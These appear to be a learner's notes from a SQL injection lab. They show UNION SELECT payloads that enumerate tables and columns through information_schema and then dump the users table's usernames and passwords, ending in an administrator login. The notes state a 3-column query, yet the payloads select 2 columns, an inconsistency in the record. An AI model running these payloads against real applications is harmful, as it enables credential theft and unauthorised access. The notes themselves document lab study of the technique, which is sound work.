# Learning Notes

## Topic

Retrieving Data from Other Tables

---

## Goal

Extract administrator credentials using UNION SELECT.

---

## Previously Known

Columns

```
3
```

Text Columns

```
2
```

---

## Enumeration

### Find Tables

```sql
' UNION SELECT table_name,NULL
FROM information_schema.tables--
```

Found

```
users
```

---

### Find Columns

```sql
' UNION SELECT column_name,NULL
FROM information_schema.columns
WHERE table_name='users'--
```

Found

```
username
password
```

---

### Retrieve Credentials

```sql
' UNION SELECT username,password
FROM users--
```

Returned

```
administrator
password
```

---

## Login

Successfully authenticated using the retrieved administrator credentials.

---

## Skills Learned

- Database Enumeration
- information_schema.tables
- information_schema.columns
- UNION SELECT
- Credential Extraction
- Authentication Bypass